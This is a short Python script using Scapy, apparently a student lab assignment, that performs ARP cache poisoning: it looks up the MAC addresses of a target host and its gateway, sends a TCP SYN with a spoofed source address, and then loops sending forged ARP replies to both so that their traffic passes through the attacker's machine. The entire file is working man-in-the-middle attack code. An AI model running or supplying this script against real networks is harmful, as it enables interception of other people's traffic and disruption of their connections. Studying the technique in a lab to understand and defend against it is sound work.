"""
Luyckx Marco 496283
Bouhnine Ayoub 500048

ARP cache poisoning
"""

from scapy.all import *

"""
Get the MAC address of the target machine
"""
def get_mac(targetip):
    arppacket = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
    target_mac = srp(arppacket, timeout=2 , verbose=False)[0][0][1].hwsrc
    return target_mac

"""
Spoof the ARP cache of the target machine
"""
def spoof_arp_cache(targetip, target_mac, sourceip):
    spoofed = ARP(op=2, pdst=targetip, psrc=sourceip, hwdst=target_mac)
    send(spoofed, verbose=False)

"""
Craft a packet with a spoofed source IP address
"""
def craft_packet_target_ip(hostip, targetip):
    ip = IP(dst=hostip, src=targetip)
    tcp = TCP(dport=80, sport=RandShort(), flags="S")
    packet = ip / tcp
    send(packet)

def main():
    hostip = "10.12.0.10"
    targetip = "10.1.0.3"
    gatewayip = "10.1.0.1"

    craft_packet_target_ip(hostip, targetip) # Send a packet to the target to make sure it is in the ARP cache

    try:
        target_mac = get_mac(targetip) 
        print("Target MAC", target_mac)
    except:
        print("Target machine did not respond to ARP broadcast")
        quit()

    try:
        gatewaymac = get_mac(gatewayip)
        print("Gateway MAC:", gatewaymac)
    except:
        print("Gateway is unreachable")
        quit()
    try:
        print("Sending spoofed ARP responses")
        while True:
            spoof_arp_cache(targetip, target_mac, gatewayip)
            spoof_arp_cache(gatewayip, gatewaymac, targetip)
    except KeyboardInterrupt:
        print("ARP spoofing stopped")
        quit()

if __name__ == "__main__":
    main()